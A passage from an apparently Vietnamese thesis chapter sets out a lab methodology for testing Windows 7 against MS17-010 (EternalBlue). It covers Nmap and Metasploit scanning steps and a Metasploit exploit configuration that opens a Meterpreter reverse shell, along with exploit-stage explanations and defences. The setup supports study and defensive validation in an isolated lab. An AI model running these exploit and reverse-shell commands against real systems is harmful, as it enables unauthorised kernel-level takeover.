4. **Observation Point:** Giao diện mạng `eth0` của Kali Linux và tệp tin bắt gói `pcap` tại máy mục tiêu.
5. **Success Criterion:** Cổng TCP 445 hiển thị trạng thái `open`, trường lý do ghi nhận `syn-ack`, tên dịch vụ định danh chính xác là `microsoft-ds`.
6. **Failure Criterion:** Cổng hiển thị `filtered` (gói tin bị drop, không có phản hồi hoặc nhận ICMP unreachable) hoặc `closed` (nhận gói TCP RST từ máy đích).
7. **Output / Evidence:** Dữ liệu xuất Nmap định dạng văn bản và tệp XML; bản ghi gói tin TCP bắt tay bắt đầu bằng cờ SYN và phản hồi SYN-ACK trong Wireshark.
8. **Inference Boundary:** Chỉ được phép kết luận máy mục tiêu đang lắng nghe dịch vụ chia sẻ tệp trên cổng 445 (xác nhận tiền điều kiện $R$ và $S$ đạt Cấp độ 1). Không được suy diễn hệ thống có lỗ hổng MS17-010.
9. **Limitation:** Tường lửa có tính năng giả lập SYN-ACK (SYN Proxy) có thể gây dương tính giả về trạng thái mở cổng.
10. **Defense Breakpoint:** Bị bẻ gãy khi Tường lửa thực thi quy tắc chặn lưu lượng ($R = \text{False}$ tại trạng thái $S_3$).

### 2.4.2. Kỹ thuật 2: Thăm dò khả năng đàm phán phương ngữ (Dialect Negotiation Probe)

1. **Input:** Lệnh `nmap -p 445 --script smb-protocols 192.168.10.20`.
2. **Preconditions:** $R = \text{True}$ và $S = \text{True}$ (cổng TCP 445 mở và dịch vụ phản hồi).
3. **Internal Mechanism:** Kịch bản NSE hoàn tất bắt tay ba bước TCP, sau đó gửi bản tin `SMB_COM_NEGOTIATE` (mã lệnh `0x72`) chứa danh sách mảng chuỗi phương ngữ từ SMB 1.0 (`NT LM 0.12`) đến SMB 3.1.1. Dịch vụ `LanmanServer` của máy đích phân tích danh sách và phản hồi bản tin xác nhận chỉ số phương ngữ được lựa chọn [6], [9].
4. **Observation Point:** Lưu lượng phân tích giao thức SMB trong Wireshark tại trạm Kali Linux.
5. **Success Criterion:** Đầu ra kịch bản liệt kê danh sách phương ngữ được máy chủ chấp nhận có chứa `NT LM 0.12 (SMBv1)`.
6. **Failure Criterion:** Máy chủ từ chối đàm phán, chỉ chấp nhận phương ngữ từ `SMB 2.0.2` trở lên, hoặc ngắt kết nối phiên làm việc bằng cờ TCP FIN/RST.
7. **Output / Evidence:** Danh mục các phương ngữ do script hiển thị trên màn hình console; gói tin `SMB Negotiate Protocol Response` trong Wireshark với trường `Dialect Index` trỏ tới chuỗi `NT LM 0.12`.
8. **Inference Boundary:** Kết luận hệ thống hỗ trợ giao thức cũ SMBv1 (xác nhận tiền điều kiện $D = \text{True}$ đạt Cấp độ 2). Không chứng minh được hệ thống có lỗ hổng vì hệ thống đã vá vẫn có thể bật SMBv1.
9. **Limitation:** Không phát hiện được nếu dịch vụ SMB yêu cầu bắt buộc ký số (SMB Signing Required) ở mức độ ngăn chặn phiên thăm dò nặc danh ban đầu.
10. **Defense Breakpoint:** Bị bẻ gãy khi thực hiện cấu hình vô hiệu hóa máy chủ SMBv1 ($D = \text{False}$ tại trạng thái $S_2$).

### 2.4.3. Kỹ thuật 3: Dò quét phát hiện dấu hiệu lỗ hổng bằng Nmap NSE (`smb-vuln-ms17-010.nse`)

1. **Input:** Lệnh `nmap -p 445 --script smb-vuln-ms17-010 --script-args unsafe=0 -n -Pn 192.168.10.20`.  
   *Ý nghĩa tham số an toàn:* Trong mã nguồn kịch bản `smb-vuln-ms17-010.nse` [9], tham số `unsafe` điều khiển mức độ can thiệp vào driver của hệ thống đích. Nếu kích hoạt `unsafe=1`, kịch bản sẽ phát sinh thêm các gói tin thăm dò sâu có khả năng gây xung đột và làm mất ổn định driver `srv.sys`. Cấu hình tường minh `--script-args unsafe=0` là bắt buộc nhằm bảo đảm kịch bản chỉ sử dụng cơ chế thăm dò kiểm tra tham số an toàn thông qua hàm `PeekNamedPipe` (mã `0x2300`) trên đường ống `IPC$`, nhận diện lỗ hổng thuần túy qua mã trạng thái phản hồi mà không gây rủi ro làm xáo trộn vùng nhớ Non-Paged Pool của hệ điều hành.
2. **Preconditions:** $R = \text{True}, S = \text{True}, D = \text{True}$ (cổng 445 mở, dịch vụ chạy, chấp nhận SMBv1).
3. **Internal Mechanism:** Kịch bản thực hiện tuần tự: (a) Bắt tay đàm phán SMBv1; (b) Khởi tạo phiên nặc danh (Null Session) qua `Session Setup AndX`; (c) Gửi yêu cầu `Tree Connect AndX` gắn kết tài nguyên chia sẻ ẩn liên tiến trình `\\IP\IPC$`; (d) Gửi một bản tin `SMB_COM_TRANSACTION` (opcode `0x25`) chứa hàm con `PeekNamedPipe` (mã `0x2300`) với tham số `MaxDataCount` thiết lập giá trị tối đa `0xFFFF` [8], [9].
4. **Observation Point:** Bản tin phản hồi SMB trong tệp tin pcap tại trạm Kali Linux và trạm máy mục tiêu.
5. **Success Criterion (Phát hiện dấu hiệu lỗ hổng):** Driver `srv.sys` của máy mục tiêu phản hồi mã lỗi `STATUS_INSUFF_SERVER_RESOURCES` (`0xC0000205`). Kịch bản kết luận hệ thống có dấu hiệu lỗ hổng (`State: VULNERABLE`) tương ứng Cấp độ 3.
6. **Failure Criterion (Không phát hiện dấu hiệu):** Máy mục tiêu phản hồi mã lỗi `STATUS_ACCESS_DENIED` (`0xC0000022`) hoặc `STATUS_INVALID_HANDLE` (`0xC0000008`), kịch bản kết luận hệ thống có khả năng cao đã được vá an toàn (`NOT VULNERABLE / Likely Patched`) [8], [9].
7. **Output / Evidence:** Đoạn văn bản kết luận lỗ hổng của NSE script chứa mã CVE-2017-0144 và điểm rủi ro; trường `NT Status` trong tiêu đề gói tin `SMB Header` phản hồi ghi nhận giá trị `0xC0000205`.
8. **Inference Boundary:** Chỉ chứng minh driver `srv.sys` xử lý logic kiểm tra tham số theo mẫu của hệ thống chưa vá (xác nhận tiền điều kiện $V = \text{True}$ đạt Cấp độ 3). Không chứng minh được việc khai thác thực tế sẽ thành công, do chưa kiểm chứng khả năng phân bổ và kiểm soát vùng nhớ kernel pool.
9. **Limitation:** Nếu máy mục tiêu cấu hình chính sách từ chối hoàn toàn phiên nặc danh (`RestrictAnonymous = 2`) và người kiểm thử không cung cấp tài khoản xác thực hợp lệ, kịch bản không thể mở kênh `IPC$` và trả về kết quả không xác định (Inconclusive).
10. **Defense Breakpoint:** Bị bẻ gãy khi hệ điều hành được cài đặt bản cập nhật KB4012212 ($V = \text{False}$ tại trạng thái $S_1$).

### 2.4.4. Kỹ thuật 4: Khảo sát đối chứng độc lập bằng Metasploit Auxiliary Scanner

1. **Input:** Module `auxiliary/scanner/smb/smb_ms17_010` trong Metasploit Framework với tham số `RHOSTS 192.168.10.20`.
2. **Preconditions:** $R = \text{True}, S = \text{True}, D = \text{True}$.
3. **Internal Mechanism:** Module độc lập phát sinh gói tin thăm dò tương tự kịch bản NSE nhưng sử dụng cấu trúc phân tích đối chứng của Metasploit, nhằm kiểm tra chéo (Cross-validation) tính nhất quán của phản hồi từ driver `srv.sys` mà không kích hoạt shellcode [5], [6].
4. **Observation Point:** Nhật ký điều khiển Metasploit console và lưu lượng mạng bắt trên card `eth0`.
5. **Success Criterion:** Console hiển thị thông báo nhận diện máy mục tiêu tồn tại lỗ hổng: `[+] 192.168.10.20:445 - Host is likely VULNERABLE to MS17-010!`.
6. **Failure Criterion:** Console hiển thị thông báo hệ thống không tồn tại lỗ hổng hoặc đã được vá: `[-] 192.168.10.20:445 - Host does NOT appear vulnerable`.
7. **Output / Evidence:** Dòng log xác nhận của module phụ trợ, đóng vai trò bằng chứng độc lập thứ hai đối chiếu với kết quả Nmap NSE.
8. **Inference Boundary:** Củng cố bằng chứng ở Cấp độ 3. Không cấu thành bằng chứng khai thác thành công ở Cấp độ 4.
9. **Limitation:** Phụ thuộc vào tính ổn định của thư viện Ruby SMB client trong framework.
10. **Defense Breakpoint:** Bị bẻ gãy khi cài đặt bản vá KB4012212 ($V = \text{False}$ tại $S_1$) hoặc tắt SMBv1 ($D = \text{False}$ tại $S_2$).

### 2.4.5. Kỹ thuật 5: Xác minh mức độ tác động có kiểm soát bằng Metasploit Exploit Module

1. **Input:** Module `exploit/windows/smb/ms17_010_eternalblue` với cấu hình tham số kiểm soát an toàn:
   ```text
   set RHOSTS 192.168.10.20
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST 192.168.20.10
   set LPORT 4444
   set MaxExploitAttempts 1
   exploit
   ```
   *Ý nghĩa tham số an toàn:* Khác với khai thác phần mềm ở không gian người dùng (User-mode), EternalBlue can thiệp trực tiếp vào cấu trúc Non-Paged Pool của nhân hệ điều hành [3], [5]. Thao tác sắp xếp bộ nhớ (Pool Grooming) đòi hỏi tính liên tục về địa chỉ. Nếu lần khai thác đầu tiên không thành công (do phân mảnh bộ nhớ thực tế hoặc con trỏ bị trượt), việc để module tự động thử lại nhiều lần (`MaxExploitAttempts > 1`) sẽ liên tục ghi đè vào các khối pool kế cận, dẫn đến hỏng cấu trúc danh sách liên kết (Corrupted Pool Header) và gần như chắc chắn gây sập hệ thống (BSOD mã `0x00000019` hoặc `0x00000050`). Cấu hình `set MaxExploitAttempts 1` bảo đảm kỷ luật kiểm thử an toàn: chỉ thực thi đúng một lần duy nhất; nếu không đạt kết quả mong muốn, dừng ngay để kích hoạt quy trình Rollback snapshot sạch, bảo toàn tính xác định của môi trường thực nghiệm.
2. **Preconditions:** Toàn bộ chuỗi tiền điều kiện $R \land S \land D \land V = \text{True}$; trạm Pentest mở cổng lắng nghe `4444` sẵn sàng tiếp nhận kết nối ngược; và chính sách Tường lửa cho phép lưu lượng TCP từ máy chủ mục tiêu (`192.168.10.20`) kết nối ngược ra cổng `4444` của trạm Kali (`192.168.20.10`) nhằm kiểm chứng kênh $C$.
3. **Internal Mechanism:** Module thực thi kỹ thuật khai thác qua ba giai đoạn phức tạp:
   - *Giai đoạn 1 (Kích hoạt lỗi FEA):* Gửi các gói tin SMBv1 cấu trúc sai lệch để kích hoạt lỗi chuyển đổi kích thước danh sách FEA trong hàm `SrvOs2FeaListSizeToNt`, tạo điều kiện ghi ngoài biên bộ đệm được cấp phát [3], [5].
   - *Giai đoạn 2 (Bố trí vùng nhớ Non-Paged Pool - Pool Grooming):* Gửi liên tiếp nhiều gói tin tạo kết nối SMB nhằm chiếm các vùng nhớ trống (holes) liền kề nhau trong Non-Paged Pool, định vị đối tượng mục tiêu cần ghi đè ngay sau bộ đệm bị tràn [3], [5].
   - *Giai đoạn 3 (Ghi đè cấu trúc điều khiển và thực thi Shellcode):* Kích hoạt tràn bộ nhớ, ghi đè con trỏ hàm trong cấu trúc điều khiển của driver kernel để chuyển hướng luồng thực thi CPU sang vùng nhớ chứa shellcode. Shellcode thực thi với đặc quyền cao nhất của hệ điều hành (`NT AUTHORITY\SYSTEM`), tiêm mã độc vào tiến trình hệ thống (như `spoolsv.exe` hoặc `lsass.exe`) và khởi tạo kết nối TCP ngược về máy Kali Linux qua cổng 4444 [5], [6].
4. **Observation Point:** Cửa sổ dòng lệnh Metasploit; danh sách tiến trình trên máy mục tiêu; bản tin TCP kết nối ngược trên Wireshark.
5. **Success Criterion (Chỉ áp dụng để công nhận Cấp độ 4 PASS):**
   - Thiết lập thành công phiên tương tác Meterpreter (`Meterpreter session 1 opened`).
   - Thực thi thành công lệnh kiểm tra quyền hạn trả về chuỗi định danh: `getuid` $\to$ `NT AUTHORITY\SYSTEM`.
   - Thu thập được bằng chứng thực thi lệnh hệ điều hành thành công trong phiên tương tác (ví dụ: `sysinfo`, `ipconfig`).
6. **Failure Criterion (Nhận diện thất bại và phân định lỗi sập hệ thống):**
   - *Trường hợp thất bại an toàn (Safe Fail):* Module thông báo lỗi kết nối, bị từ chối hoặc khai thác không thành công nhưng hệ điều hành mục tiêu vẫn duy trì hoạt động bình thường (`Exploit completed, but no session was created`).
   - *Trường hợp lỗi dừng hệ thống (Kernel Crash / BSOD):* Máy mục tiêu xuất hiện màn hình xanh dừng hệ thống (Bug Check mã `0x00000050` hoặc `0x000000C5`) và tự động khởi động lại, dịch vụ SMB bị gián đoạn. **Trường hợp này không được tính là khai thác thành công (Exploit Success), mà phải được phân loại chính xác là `EXPLOIT_FAILED (KERNEL_INSTABILITY / CRASH)` tương ứng tiền điều kiện $E = \text{False}$**.
7. **Output / Evidence:** Log phiên làm việc Metasploit; mã định danh tiến trình mục tiêu (`PID`); lưu lượng TCP bắt tay trên cổng 4444 trong tệp pcap.
8. **Inference Boundary:** Chứng minh cấu hình tại trạng thái kiểm thử có thể bị kiểm soát toàn diện ở mức nhân (đạt Cấp độ 4). Không được suy diễn kết quả này áp dụng cho mọi hệ điều hành Windows khác nếu không qua kiểm chứng pool grooming tương ứng.
9. **Limitation:** Tỷ lệ thành công của pool grooming chịu ảnh hưởng bởi mức độ phân mảnh bộ nhớ thực tế tại thời điểm khai thác.
10. **Defense Breakpoint:** Bị bẻ gãy khi cài đặt bản vá KB4012212 ($V = \text{False}$ tại $S_1$), tắt SMBv1 ($D = \text{False}$ tại $S_2$), hoặc chặn tường lửa ($R = \text{False}$ tại $S_3$).

*Bảng 2.3: Bảng đối chiếu các kỹ thuật kiểm thử với các tiền điều kiện và 4 cấp độ trạng thái*

| Kỹ thuật kiểm thử | Công cụ thực thi | Tiền điều kiện kiểm chứng | Cấp độ đối chiếu | Bằng chứng kỹ thuật cốt lõi |
|---|---|:---:|:---:|---|
| **Kỹ thuật 1** | `nmap -sS -sV -p 445` | $R, S$ | **Cấp độ 1** | Gói tin phản hồi `SYN-ACK`, định danh dịch vụ `microsoft-ds` |
| **Kỹ thuật 2** | `nmap --script smb-protocols` | $D$ | **Cấp độ 2** | Bản tin chấp nhận phương ngữ `NT LM 0.12 (SMBv1)` |
| **Kỹ thuật 3** | `nmap --script smb-vuln-ms17-010` | $V$ | **Cấp độ 3** | Mã lỗi NT Status phản hồi `STATUS_INSUFF_SERVER_RESOURCES` (`0xC0000205`) |
| **Kỹ thuật 4** | `auxiliary/scanner/smb/smb_ms17_010` | $V$ | **Cấp độ 3** | Log xác nhận đối chứng độc lập từ Metasploit Framework |
| **Kỹ thuật 5** | `exploit/.../ms17_010_eternalblue` | $E, C$ | **Cấp độ 4** | Phiên Meterpreter quyền `SYSTEM` (BSOD bị tính là FAIL) |

Sơ đồ 2.2 mô tả tuần tự luồng kiểm thử nhân quả và sự tương tác giữa các kỹ thuật:

```
[Trạm kiểm thử: Kali Linux]
         |
         |---> (1) Kỹ thuật 1: Kiểm chứng R & S (Cổng 445 mở / microsoft-ds?)
         |     [Thất bại: Dừng -> R=0 hoặc S=0] ---> Thành công (Cấp độ 1)
         |
         |---> (2) Kỹ thuật 2: Kiểm chứng D (Chấp nhận dialect NT LM 0.12?)
         |     [Thất bại: Dừng -> D=0] -----------> Thành công (Cấp độ 2)
         |
         |---> (3) Kỹ thuật 3 & 4: Kiểm chứng V (Mã lỗi NT Status 0xC0000205?)
         |     [Thất bại: V=0 -> Hệ thống đã vá] -> Thành công (Cấp độ 3)
         |
         |---> (4) Kỹ thuật 5: Kiểm chứng E & C (Khai thác có kiểm soát)
               |
               +---> Phiên Meterpreter thành công? ===> PASS CẤP ĐỘ 4 (RCE SYSTEM)
               |
               +---> BSOD / Crash / Reboot / Timeout? => FAIL CẤP ĐỘ 4 (E=0 / Crash)
```
*Sơ đồ 2.2: Sơ đồ tuần tự các pha kiểm thử theo mô hình chuỗi nhân quả*

---

## 2.5. MA TRẬN BẰNG CHỨNG ĐA NGUỒN VÀ QUY TRÌNH VẬN HÀNH AN TOÀN

### 2.5.1. Thiết kế Ma trận bằng chứng thu thập đa nguồn (Evidence Matrix)

Nhằm đảm bảo tính minh bạch và khả năng truy vết chặt chẽ của thực nghiệm, mọi dữ liệu kiểm thử tại Chương 3 sẽ được đối chiếu và điền vào Ma trận bằng chứng thiết kế trước tại Bảng 2.4. Trong phạm vi thiết kế phương pháp luận của Chương 2, toàn bộ các ô dữ liệu đo lường thực nghiệm chưa chạy đều được gán nhãn `[CẦN DỮ LIỆU]` theo đúng quy định của đề tài:

*Bảng 2.4: Ma trận bằng chứng thực nghiệm đối chiếu đa nguồn (Evidence Matrix)*

| Snapshot State | Windows Build & Hotfix | Cấu hình SMBv1 | Trạng thái Routing / Firewall | Nmap Raw Output & Reason | Mã phản hồi NSE (NT Status) | Metasploit Console Log | Bằng chứng Wireshark PCAP | Firewall Drop Log Evidence | Kết luận Cấp độ 1–4 |
|:---:|---|---|---|---|---|---|---|---|:---:|
| **$S_0$** | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` |
| **$S_1$** | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` |
| **$S_2$** | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` |
| **$S_3$** | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` |

### 2.5.2. Quy trình kiểm chứng lưu lượng đa điểm (Multi-Point PCAP Verification)

Để chứng minh một biện pháp phòng thủ (đặc biệt là phân đoạn mạng tại trạng thái $S_3$) thực sự bẻ gãy tiền điều kiện tiếp cận mạng ($R = \text{False}$), người kiểm thử không thể chỉ dựa vào thông báo `Host seems down` của Nmap. Thay vào đó, quy trình kiểm chứng lưu lượng mạng đa điểm được thiết lập tại ba vị trí quan sát đồng thời:
1. **Điểm quan sát 1 (Tại trạm Pentest - VLAN 20):** Bắt gói tin trên card `eth0` ghi nhận lệnh Nmap có phát sinh các gói tin TCP SYN gửi tới địa chỉ đích `192.168.10.20` cổng 445.
2. **Điểm quan sát 2 (Tại thiết bị Tường lửa/UTM):** Kiểm tra bảng nhật ký lưu lượng (Firewall Filter Logs). Ghi nhận bản ghi tường lửa kích hoạt quy tắc chặn (Rule Drop/Reject) đối với gói tin TCP từ IP nguồn `192.168.20.10` tới IP đích `192.168.10.20:445`.
3. **Điểm quan sát 3 (Tại máy mục tiêu - VLAN 10):** Bắt gói tin trên card mạng của `Target-Win7`. Kết quả kiểm chứng **hoàn toàn vắng mặt bất kỳ gói tin TCP SYN nào** xuất phát từ địa chỉ `192.168.20.10`.

Sự kết hợp đồng thời của ba bằng chứng: (a) Gói tin được gửi đi từ nguồn; (b) Tường lửa ghi nhận hành vi chặn; (c) Gói tin không đến được đích, là bằng chứng khoa học khẳng định tiền điều kiện $R$ đã bị bẻ gãy có kiểm chứng trên thực tế.

### 2.5.3. Kế hoạch ứng phó sự cố màn hình xanh (BSOD) và quy trình Rollback

Do hiện tượng phân mảnh pool trong quá trình khai thác kernel luôn tiềm ẩn nguy cơ làm sập hệ điều hành, quy trình quản lý trạng thái và ứng phó sự cố được chuẩn hóa theo Sơ đồ 2.3:

```
+-------------------------------------------------------------+
|               BƯỚC 1: KHỞI TẠO VÀ LƯU SNAPSHOT              |
|        Tạo "Clean Baseline" khi máy ảo ở trạng thái sạch    |
|        (S0_Clean, S1_Clean, S2_Clean, S3_Clean)             |
+------------------------------+------------------------------+
                               |
                               v
+-------------------------------------------------------------+
|               BƯỚC 2: THỰC THI KỊCH BẢN KIỂM THỬ            |
|       Chạy Kỹ thuật 1 -> Kỹ thuật 2 -> Kỹ thuật 3 -> KT 5   |
+------------------------------+------------------------------+
                               |
                               v
               /-------------------------------\
              /    Hệ thống có bị sự cố BSOD?   \
              \      (Crash nhân hệ điều hành)  /
               \-------------------------------/
                       |               |
                  CÓ   |               |   KHÔNG
                       v               v
+------------------------------+  +---------------------------+
| BƯỚC 3A: QUY TRÌNH ROLLBACK  |  | BƯỚC 3B: GHI NHẬN KẾT QUẢ |
| - Dừng tiến trình Metasploit |  | - Thu thập log phiên MSF  |
| - Đánh dấu: Cấp 4 = FAIL     |  | - Dừng bắt gói tệp .pcap  |
| - Khôi phục Snapshot sạch    |  | - Thu thập Firewall log   |
| - Kiểm tra sẵn sàng dịch vụ  |  | - Chuyển pha đối chứng    |
+------------------------------+  +---------------------------+
```
*Sơ đồ 2.3: Quy trình quản lý trạng thái máy ảo và cơ chế khôi phục tức thời qua Snapshot*

Trình tự thực hiện rollback khi phát sinh sự cố:
1. **Ghi nhận sự cố:** Khi lệnh exploit gây màn hình xanh, ghi nhận mã dừng hệ thống (Bug Check Code), thời điểm phát sinh và đánh dấu kết quả thực nghiệm là `FAIL (KERNEL_CRASH)`.
2. **Ngắt kết nối:** Lập tức dừng tiến trình kiểm thử trên máy Kali Linux để giải phóng các socket mạng đang mở.
3. **Thực thi Rollback:** Sử dụng chức năng quản lý snapshot của nền tảng ảo hóa khôi phục máy mục tiêu về trạng thái sạch tương ứng ($S_0, S_1, S_2$ hoặc $S_3$). Thao tác này hoàn tất trong thời gian dưới 10 giây, đưa nhân hệ điều hành về trạng thái phân bổ bộ nhớ ban đầu không bị phân mảnh.
4. **Kiểm tra tính sẵn sàng (Pre-flight Check):** Thực hiện một phép kiểm tra ICMP Ping và kiểm tra cổng 445 từ trạm Client (VLAN 30) để xác nhận dịch vụ chia sẻ tệp đã phục hồi trước khi tiếp tục thực nghiệm.

---

## TỔNG KẾT CHƯƠNG 2

Chương 2 đã hoàn thành toàn diện việc thiết kế và chuẩn hóa mô hình thực nghiệm kiểm thử an ninh giao thức SMB theo phương pháp luận khoa học chặt chẽ:
1. Xác lập phương pháp luận chuỗi nhân quả (Causal-Chain Model), mô hình hóa đường tấn công CVE-2017-0144 thành hệ thống 6 tiền điều kiện hình thức $(R, S, D, V, E, C)$ và làm rõ nguyên lý bẻ gãy phòng thủ tại các mắt xích logic.
2. Xây dựng kiến trúc mạng phân đoạn doanh nghiệp mô phỏng gồm 3 VLAN (Server, Pentest, User) kết nối qua Tường lửa/UTM làm điểm định tuyến và kiểm soát tập trung, ngắt hoàn toàn kết nối Internet thực nhằm loại trừ rủi ro phát tán mã độc.
3. Chuẩn hóa máy trạng thái đơn biến 4 nấc snapshot ($S_0 \to S_1 \to S_2 \to S_3$) trên cùng một hệ thống Windows 7 SP1 x64 mục tiêu, đồng thời tích hợp trạm Windows Client tại VLAN 30 làm đối chứng nghiệp vụ dương tính, khẳng định tính toàn vẹn của dịch vụ trong suốt quá trình hardening.
4. Chuẩn hóa 5 kỹ thuật đo lường theo mô hình bạch hộp 10 thành phần; thiết lập tiêu chuẩn đánh giá Cấp độ 4 nghiêm ngặt (chỉ công nhận khi thực thi mã thành công, loại trừ BSOD/Crash khỏi kết quả thành công); thiết kế trước Ma trận bằng chứng thu thập đa nguồn (Evidence Matrix) và cơ chế rollback snapshot an toàn.

Toàn bộ khung kiến trúc, hệ thống tiền điều kiện và các kỹ thuật đo lường được chuẩn hóa trong Chương 2 là căn cứ phương pháp luận duy nhất để tiến hành các lượt chạy thực nghiệm và thu thập số liệu đối chứng chi tiết trong Chương 3.

---

## TÀI LIỆU THAM KHẢO

[1] G. Weidman, *Penetration Testing: A Hands-On Introduction to Hacking*. San Francisco, CA: No Starch Press, 2014.

[2] C. McNab, *Network Security Assessment: Know Your Network*, 3rd ed. Sebastopol, CA: O'Reilly Media, 2016.

[3] P. Yosifovich, D. A. Solomon, and A. Ionescu, *Windows Internals, Part 1: System architecture, processes, threads, memory management, and more*, 7th ed. Redmond, WA: Microsoft Press, 2017.

[4] Microsoft, "Microsoft Security Bulletin MS17-010 - Critical," Microsoft Learn / Security TechCenter, Mar. 2017. [Online]. Available: https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010

[5] Rapid7, "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption," Rapid7 Exploit Database, 2017. [Online]. Available: https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/

[6] D. Kennedy, J. O'Gorman, D. Kearns, and M. Aharoni, *Metasploit: The Penetration Tester's Guide*, 2nd ed. San Francisco, CA: No Starch Press, 2024.

[7] Microsoft, "Detect, enable, and disable SMBv1, SMBv2, and SMBv3 in Windows," Microsoft Learn, 2025. [Online]. Available: https://learn.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3

[8] G. Lyon, *Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Vulnerability Scanning*. Sunnyvale, CA: Insecure.Com LLC, 2009.

[9] P. Calderon and Nmap Project, "smb-vuln-ms17-010.nse Script Source Code," Nmap Project, 2017. [Online]. Available: https://svn.nmap.org/nmap/scripts/smb-vuln-ms17-010.nse

